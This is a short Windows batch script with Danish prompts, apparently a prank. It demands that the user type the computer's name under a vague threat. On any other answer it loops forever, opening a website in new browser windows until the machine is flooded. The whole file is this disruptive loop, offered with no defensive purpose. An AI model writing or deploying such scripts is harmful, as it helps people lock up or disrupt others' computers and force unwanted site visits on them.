@echo off
color 02
title DU SKAL SVARE RIGTIGT ELLERS HELD OG LYKKE
echo DU SKAL SVARE RIGTIGT ELLERS HELD OG LYKKE
set comp=
set /p comp=Hvad er computerens navn? 
if /I NOT "%comp%"=="computer" (
	:a 
start www.lillebror420.dk/info
goto :a 
)


